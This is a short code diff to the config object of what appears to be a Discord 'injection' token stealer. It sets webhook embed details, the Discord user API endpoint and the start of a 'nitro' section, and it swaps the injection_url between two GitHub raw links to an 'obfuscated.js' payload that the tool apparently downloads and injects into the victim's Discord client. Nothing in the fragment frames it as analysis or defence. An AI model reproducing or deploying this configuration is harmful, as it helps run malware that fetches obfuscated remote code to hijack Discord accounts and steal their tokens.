@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Christopheryves Injection', 
   embed_icon: 'https://resmim.net/cdn/2024/02/09/ZJtetH.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/psikiyatrist/discord-injection/main/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/doracan/discord-injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
